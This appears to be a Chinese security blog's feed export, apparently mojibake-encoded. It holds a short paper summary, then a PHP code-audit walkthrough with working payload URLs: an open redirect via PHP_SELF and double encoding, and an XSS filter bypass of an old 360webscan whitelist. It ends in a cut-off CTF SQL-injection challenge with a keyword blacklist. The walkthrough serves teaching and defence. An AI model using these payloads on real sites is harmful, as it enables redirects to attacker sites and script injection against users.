        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>æ–‡ç« æå‡ºäº†CamProï¼Œè¿™æ˜¯ä¸€ä¸ªæ–°é¢–çš„æ–¹æ³•ï¼Œå¯ä»¥åœ¨ç›¸æœºæ¨¡å—ä¸­æ•è·å¤©ç”Ÿå…·æœ‰AFRç‰¹æ€§çš„å›¾åƒã€‚CamProé€šè¿‡è°ƒæ•´ç›¸æœºå›¾åƒä¿¡å·å¤„ç†å™¨ï¼ˆISPï¼‰ä¸­çš„é…ç½®è®¾ç½®ï¼Œä¾‹å¦‚é¢œè‰²æ ¡æ­£çŸ©é˜µå’Œä¼½é©¬æ ¡æ­£ï¼Œæ¥å®ç°AFRï¼Œå¹¶è®¾è®¡äº†ä¸€ä¸ªå›¾åƒå¢å¼ºå™¨æ¥ä¿æŒå¯èƒ½çš„äººç±»è§‚ä¼—çš„å›¾åƒè´¨é‡ã€‚å®éªŒè¡¨æ˜ï¼ŒCamProå¯¹åç§æœ€å…ˆè¿›çš„é»‘ç›’é¢éƒ¨è¯†åˆ«æ¨¡å‹éå¸¸æœ‰æ•ˆï¼Œå°†é¢éƒ¨è¯†åˆ«å‡†ç¡®ç‡æ˜¾è‘—é™ä½åˆ°0.3%ï¼ŒåŒæ—¶å¯¹ç›®æ ‡éæ•æ„Ÿè§†è§‰åº”ç”¨çš„å½±å“å¾ˆå°ã€‚æ­¤å¤–ï¼ŒCamProå¯¹é€‚åº”æ€§æ”»å‡»è€…ä¹Ÿå…·æœ‰å¼¹æ€§ï¼Œå³ä½¿æ”»å‡»è€…é‡æ–°è®­ç»ƒäº†ä½¿ç”¨CamProç”Ÿæˆçš„å›¾åƒçš„é¢éƒ¨è¯†åˆ«æ¨¡å‹ï¼Œå¹¶ä¸”å®Œå…¨äº†è§£éšç§ä¿æŠ¤ISPå‚æ•°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç§ä¿æŠ¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ä»£ç å®¡è®¡ã€‘PHPä»£ç å®¡è®¡5</title>
      <link href="/2024/10/16/WebSecurity/codeaudit/phpaudit5/"/>
      <url>/2024/10/16/WebSecurity/codeaudit/phpaudit5/</url>
      
        <content type="html"><![CDATA[<h2 id="Day-15-Sleigh-Ride"><a href="#Day-15-Sleigh-Ride" class="headerlink" title="Day 15 - Sleigh Ride"></a>Day 15 - Sleigh Ride</h2><p>é¢˜ç›®å«åšæ»‘é›ªæ©‡ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$websiteHost</span>=<span class="string">&#x27;www.example.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setHeaders</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span>= <span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:<span class="subst">$url</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startRedirect</span>(<span class="params"><span class="variable">$params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$parts</span>= <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line">        <span class="variable">$baseFile</span>= <span class="title function_ invoke__">end</span>(<span class="variable">$parts</span>);</span><br><span class="line">        <span class="variable">$url</span>= <span class="title function_ invoke__">sprintf</span>(</span><br><span class="line">            <span class="string">&quot;%s?%s&quot;</span>,</span><br><span class="line">            <span class="variable">$baseFile</span>,</span><br><span class="line">            <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setHeaders</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>])&#123;</span><br><span class="line">    (<span class="keyword">new</span> <span class="title class_">Redirect</span>())-&gt;<span class="title function_ invoke__">startRedirect</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;params&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ¼æ´è§£æ</strong> ï¼š</p><p>è¿™ä¸€å…³ä¸»è¦è€ƒå¯Ÿçš„æ˜¯ <strong>$_SERVER[â€˜PHP_SELFâ€™]</strong> å¼•å‘çš„ä¸€ä¸ªä»»æ„ç½‘å€è·³è½¬æ¼æ´</p><p>é¦–å…ˆï¼Œåˆ†æä¸€ä¸‹ç¨‹åºçš„è¿è¡Œ</p><ul><li>å¦‚æœæœ‰ <strong>$_GET[â€˜redirectâ€™]</strong> å‚æ•°ï¼Œé‚£ä¹ˆå°± New ä¸€ä¸ª <strong>Redirect</strong> å¯¹è±¡ï¼ŒåŒæ—¶è°ƒç”¨ <strong>Redirect</strong> ç±»çš„ <strong>startRedirect</strong> æ–¹æ³•</li><li><strong>startRedirect</strong> å‡½æ•°æ¥å—ä¸€ä¸ª <strong>GET</strong> ç±»å‹çš„ <strong>params</strong> å‚æ•°ï¼Œç„¶ååœ¨ <strong>explode()</strong> å‡½æ•°ä¸­ï¼Œå°† <strong>$_SERVER[â€˜PHP_SELFâ€™]</strong> å¾—åˆ°çš„å€¼ï¼Œä»¥ <strong>&#x2F;</strong> åˆ†å‰²æˆä¸€ä¸ª <strong>$parts</strong> æ•°ç»„ã€‚</li><li><strong>$baseFile</strong> çš„å€¼ä¸º <strong>$parts</strong> æ•°ç»„çš„æœ€åä¸€ä¸ªå€¼</li><li><strong>$url</strong> çš„å€¼ä¸º <strong>$baseFile?http_build_query($params)</strong> ï¼Œå…¶ä¸­çš„ <strong>http_build_query()</strong> å‡½æ•°å°±æ˜¯ä¸€ä¸ªå°†å‚æ•°è¿›è¡ŒURLç¼–ç çš„ä¸€ä¸ªæ“ä½œï¼Œæ¯”å¦‚ <strong>$params&#x3D;â€™test&#x3D;123â€™</strong></li><li>ç„¶åè°ƒç”¨ <strong>setHeaders</strong> å‡½æ•°ï¼Œé¦–å…ˆè§£ç  <strong>$url</strong> å‚æ•°ï¼Œç„¶å <strong>header()</strong> å‡½æ•°ç›´æ¥è·³è½¬ <strong>$url</strong></li></ul><p><strong>$_SERVER[â€˜PHPâ€™]</strong> å­˜åœ¨çš„é—®é¢˜ï¼š</p><p>åˆçœ‹è¿™ä¸ªç¨‹åºæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯PHPè‡ªå¸¦çš„**$_SERVER[â€˜PHP_SELFâ€™]** å‚æ•°æ˜¯å¯ä»¥æ§åˆ¶çš„ã€‚å…¶ä¸­ <strong>PHP_SELF</strong> æŒ‡å½“å‰çš„é¡µé¢ç»å¯¹åœ°å€ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„ç½‘ç«™ï¼š<strong><a href="http://www.test.com/redict/index.php">http://www.test.com/redict/index.php</a></strong>ï¼Œé‚£ä¹ˆ<strong>PHP_SELF</strong> å°±æ˜¯ <strong>&#x2F;redict&#x2F;index.php</strong> ã€‚ä½†æœ‰ä¸ªå°é—®é¢˜å¾ˆå¤šäººæ²¡æœ‰æ³¨æ„åˆ°ï¼Œå½“<strong>URL</strong>æ˜¯<strong>PATH_INFO</strong>çš„æ—¶å€™ï¼Œæ¯”å¦‚ï¼š<strong><a href="http://www.test.com/redict/index.php/admin">http://www.test.com/redict/index.php/admin</a></strong>ï¼Œé‚£ä¹ˆ<strong>PHP_SELF</strong>å°±æ˜¯**&#x2F;redict&#x2F;index.php&#x2F;admin** ä¹Ÿå°±æ˜¯è¯´ï¼Œå…¶å® <strong>PHP_SELF</strong> æœ‰ä¸€éƒ¨åˆ†æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚</p><p>åŒç¼–ç é—®é¢˜ï¼š</p><p>URLæœ¬æ¥æ˜¯è¢«æµè§ˆå™¨ç¼–ç è¿‡ä¸€æ¬¡ï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°æ¥è‡ªæµè§ˆå™¨URLè¯·æ±‚çš„æ—¶å€™ï¼Œä¼šå°†URLè§£ç ä¸€æ¬¡ï¼Œç”±äºåœ¨ç¨‹åºä¸­æˆ‘ä»¬çœ‹åˆ°æœ‰ <strong>urldecode()</strong> å‡½æ•°å­˜åœ¨ï¼Œå®ƒä¼šå†æ¬¡è§£ç ä¸€æ¬¡URLï¼Œæ­¤æ—¶åŒç¼–ç URLå°±å¯ä»¥åˆ©ç”¨ï¼Œç”¨äºç»•è¿‡æŸäº›å…³é”®è¯æ£€æµ‹ã€‚æ¯”å¦‚å°† <strong>&#x2F;</strong> ç¼–ç ä¸ºï¼š <strong>%252f</strong> </p><p>æ¼æ´åˆ©ç”¨ï¼š</p><p>æ¯”å¦‚æˆ‘ä»¬è¦è·³è½¬åˆ°æˆ‘çš„åšå®¢ï¼š<strong>blog.dyboy.cn</strong> ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€  <strong>Payload</strong> ï¼š<strong><a href="http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&params=test123">http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&amp;params=test123</a></strong> ï¼Œè®¿é—®å³å¯é‡å®šå‘è·³è½¬åˆ° <strong><a href="http://blog.dyboy.cn/">http://blog.dyboy.cn</a></strong> ç½‘å€ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå‘ç”Ÿäº† <strong>302</strong> è·³è½¬ï¼š</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image.png"></p><h3 id="å®ä¾‹åˆ†æ"><a href="#å®ä¾‹åˆ†æ" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>å…¶å®å…³äºè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨ï¼Œæ˜¯æœ‰å¾ˆå¤šsrcæ¡ˆä¾‹çš„ã€‚ä½†æ˜¯éƒ½æ˜¯é»‘ç›’æµ‹è¯•ï¼Œä¸æ˜¯å¾ˆæ¸…æ¥šåå°çš„ä»£ç æ€ä¹ˆè®¾è®¡çš„ï¼Œè¿™é‡Œå¯ä»¥æåŠåˆ°ä¸€ä¸ªå…³äº <strong>360webscan</strong> çš„é˜²æŠ¤è„šæœ¬ä¸€ä¸ªå†å²æ¼æ´ï¼Œæ­£æ˜¯ä½¿ç”¨äº† <strong>$_SERVER[â€˜PHP_SELFâ€™]</strong> è¿™ä¸ªå˜é‡ï¼Œå¯¼è‡´å¯ä»¥ç»•è¿‡360webscané˜²æŠ¤è„šæœ¬çš„é˜²æŠ¤ï¼Œè„šæœ¬çš„é˜²æŠ¤æ•ˆæœå¤±æ•ˆï¼Œç°åœ¨æ­¤é˜²æŠ¤è„šæœ¬æ›´æ–°äº†ã€‚</p><p>æœ€æ–°ç‰ˆä¸‹è½½åœ°å€ï¼š <a href="http://webscan.360.cn/protect/down?domain=www.test.com">http://webscan.360.cn/protect/down?domain=www.test.com</a></p><p>æ—§ç‰ˆæœ¬ä¸‹è½½åœ°å€ï¼š<a href="https://www.lanzous.com/i1qj0qh">https://www.lanzous.com/i1qj0qh</a></p><p>å…¶ç»“æ„ä¸ºï¼š</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-1.png"></p><p>å› ä¸ºè¿™åªæ˜¯ä¸€ä¸ªé˜²æŠ¤çš„è¾…åŠ©è„šæœ¬ï¼Œä»»ä½•çš„ç¨‹åºéƒ½å¯ä»¥å®‰è£…ä½¿ç”¨ï¼Œè¿™é‡Œå°±ä»¥ <strong>Emlog5.3.1</strong> åšå®¢ç¨‹åºä¸ºä¾‹å­ï¼Œç¨‹åºä¸é‡è¦ï¼Œè¿™ä¸ªè„šæœ¬å¯ä»¥å®‰è£…æ¥å…¥åˆ°ä»»ä½•çš„ç¨‹åºä¸­ã€‚</p><p>å®‰è£…çš„æ–¹æ³•ï¼šè§£å‹å¾—åˆ° <strong>360safe</strong> æ–‡ä»¶å¤¹ï¼Œä¹‹åä¸Šä¼ åˆ°æˆ‘ä»¬çš„ç½‘ç«™æ ¹ç›®å½•ä¸­ï¼ŒåŒæ—¶åœ¨ä»»æ„çš„å…¨å±€æ–‡ä»¶ä¸­åŠ å…¥å¦‚ä¸‹ä»£ç å³å¯å®‰è£…æˆåŠŸï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/360safe/360webscan.php&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/360safe/360webscan.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æŒ‰ç…§ä¸Šè¿°å®‰è£…æ–¹æ³•å®‰è£…åï¼Œæµ‹è¯•è®¿é—®ï¼š <code>http://www.test.com/index.php?test=&lt;script&gt;alert(1)&lt;/script&gt;</code> ï¼ŒXSSæ‹¦æˆªæ˜¾ç¤ºï¼š</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-2.png"></p><p>æ¯”å¦‚GETä¼ é€’çš„æ•°æ®å­˜åœ¨SQLæ³¨å…¥æ¶æ„å­—ç¬¦éƒ½ä¼šè¢«æ‹¦æˆªï¼Œè™½ç„¶æœ¬è„šæœ¬çš„æ­£åˆ™è¿‡æ»¤è§„åˆ™å¾ˆå¥½äº†ï¼Œä½†æ˜¯é€šè¿‡è¿™ä¸€ä¸ª <strong>$_SERVER[â€˜PHP_SELFâ€™]</strong> ï¼Œå¯ä»¥é€šè¿‡ç™½åå•è§„åˆ™ç»•è¿‡æ”»å‡»é˜²æŠ¤ã€‚</p><p>åœ¨å­˜åœ¨ç»•è¿‡æ¼æ´çš„360webscanå†å²ç‰ˆæœ¬ä¸­ï¼Œå¦‚ä¸‹å›¾ <strong>ç¬¬194-219è¡Œ</strong> çš„çš„ä»£ç ï¼ˆæ‹¦æˆªç›®å½•ç™½åå•æ£€æµ‹ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">webscan_white</span>(<span class="params"><span class="variable">$webscan_white_name</span>, <span class="variable">$webscan_white_url</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="variable">$url_path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line">    <span class="variable">$url_var</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$webscan_white_url</span> <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span> . <span class="variable">$webscan_white_name</span> . <span class="string">&quot;/is&quot;</span>, <span class="variable">$url_path</span>) == <span class="number">1</span> &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$webscan_white_name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// æ‹¦æˆªç›®å½•ç™½åå•</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">empty</span>(<span class="variable">$url_var</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$url_var</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$url_path</span>, <span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$url_var</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šå›¾çš„ <strong>ç¬¬5è¡Œ</strong> ï¼Œæˆ‘ä»¬çœ‹åˆ° <strong>$url_path</strong> çš„å€¼æ˜¯ç›´æ¥å–çš„ <strong>$_server[â€˜PHP_SELFâ€™]</strong> çš„å€¼ï¼ŒåŒæ—¶æ²¡æœ‰åšä»»ä½•çš„éªŒè¯æˆ–è¿‡æ»¤ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦åœ¨è¯·æ±‚çš„URLï¼ˆæäº¤çš„å‚æ•°ä¸­ï¼‰å­˜åœ¨ç™½åå•ç›®å½•ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»•è¿‡å®‰å…¨æ£€æµ‹ã€‚</p><p>å› ä¸ºåœ¨ <strong>webscan_cache.php</strong> ä¸­çš„é»˜è®¤çš„ç™½åå•ç›®å½•å­˜åœ¨ <strong>admin</strong> ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”¨æˆ·å”¯ä¸€key</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WEBSCAN_U_KEY&#x27;</span>, <span class="string">&#x27;6809abbda8d53816f11500b52637e8db&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ•°æ®å›è°ƒç»Ÿè®¡åœ°å€</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WEBSCAN_API_LOG&#x27;</span>, <span class="string">&#x27;http://safe.webscan.360.cn/papi/log/?key=&#x27;</span> . WEBSCAN_U_KEY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç‰ˆæœ¬æ›´æ–°åœ°å€</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WEBSCAN_UPDATE_FILE&#x27;</span>, <span class="string">&#x27;http://safe.webscan.360.cn/papi/update/?key=&#x27;</span> . WEBSCAN_U_KEY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‹¦æˆªå¼€å…³(1ä¸ºå¼€å¯ï¼Œ@å…³é—­)</span></span><br><span class="line"><span class="variable">$webscan_switch</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æäº¤æ–¹å¼æ‹¦æˆª(1å¼€å¯æ‹¦æˆªï¼Œ@å…³é—­æ‹¦æˆªï¼Œpost,get,cookie,referreé€‰æ‹©éœ€è¦æ‹¦æˆªçš„æ–¹å¼)</span></span><br><span class="line"><span class="variable">$webscan_post</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$webscan_get</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$webscan_cookie</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$webscan_referre</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åå°ç™½åå•,åå°æ“ä½œå°†ä¸ä¼šæ‹¦æˆª,æ·»åŠ &quot;|&quot;éš”å¼€ç™½åå•ç›®å½•ä¸‹é¢é»˜è®¤æ˜¯ç½‘å€å¸¦admin/dede/æ”¾è¡Œ</span></span><br><span class="line"><span class="variable">$webscan_white_directory</span> = <span class="string">&#x27;admin|\/dede\/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// urlç™½åå•ï¼Œå¯ä»¥è‡ªå®šä¹‰æ·»åŠ urlç™½åå•ï¼Œé»˜è®¤æ˜¯å¯¹phpcmsçš„åå°urlæ”¾è¡Œ</span></span><br><span class="line"><span class="variable">$webscan_white_url</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;index.php&#x27;</span> =&gt; <span class="string">&#x27;m=admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;post.php&#x27;</span> =&gt; <span class="string">&#x27;job=postnew&amp;step=post&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edit_space_info.php&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬è®¿é—®ï¼š<strong><a href="http://www.test.com/index.php/admin?test=%3Cscript%3Ealert(1)%3C/script%3E">http://www.test.com/index.php/admin?test=%3Cscript%3Ealert(1)%3C/script%3E</a></strong></p><p>æ­¤å¤„è™½ç„¶è¿”å›çš„çŠ¶æ€ç æ˜¯ <strong>404</strong> ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬å‘ç°å·²ç»ä¸å†æ‹¦æˆªäº†ï¼Œå¦‚æœå†é…åˆæŸäº›CMSæˆ–è€…PHPç³»ç»Ÿçš„ä¼ªé™æ€ç‰¹æ®Šæ€§ï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆåŠŸçš„ç»•è¿‡é˜²æŠ¤ã€‚</p><h3 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h3><p>æœ¬æ¬¡å®¡è®¡çš„å…¶å®ä¸æ˜¯æ¼æ´ï¼Œä¸»è¦æ˜¯ä¸€ä¸ª <strong>$_SERVER[â€˜PHP_SELFâ€™]</strong> çš„é—®é¢˜ï¼Œå†é‡ä¸ŠæŸç³»ä¼ªé™æ€è§„åˆ™é…åˆä¸‹ï¼Œå°±ä¼šå¯¼è‡´å„ç§ç”±æ­¤å½¢æˆçš„å„ç§æ¼æ´ã€‚å› æ­¤ï¼Œè¿™é‡Œæ¨èä½¿ç”¨ <strong>$_SERVER[â€˜SCRIPT_NAMEâ€™]</strong> ä»£æ›¿å³å¯ï¼ŒåŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨æœ€æ–°çš„360webscanä¸­å·²ç»æ›´æ–°äº†è¿™ä¸ªé—®é¢˜ï¼Œå¹¶ä¸”å°±æ˜¯ä½¿ç”¨ <strong>$_SERVER[â€˜SCRIPT_NAMEâ€™]</strong> ã€‚</p><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$black_list</span> = <span class="string">&quot;/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\&#x27;|&quot;</span>;</span><br><span class="line"><span class="variable">$black_list</span> .= <span class="string">&quot;=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$black_list</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;:P&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$black_list</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pwd&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;:P&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select user from users where user=&#x27;<span class="subst">$_GET</span>[user]&#x27; and pwd=&#x27;<span class="subst">$_GET</span>[pwd]&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;<span class="subst">&#123;$query&#125;</span>&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Welcome <span class="subst">&#123;$row[&#x27;user&#x27;]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select pwd from users where user=&#x27;admin&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="variable">$admin_pass</span> = <span class="variable">$row</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$admin_pass</span>)&amp;&amp;(<span class="variable">$admin_pass</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;pwd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span 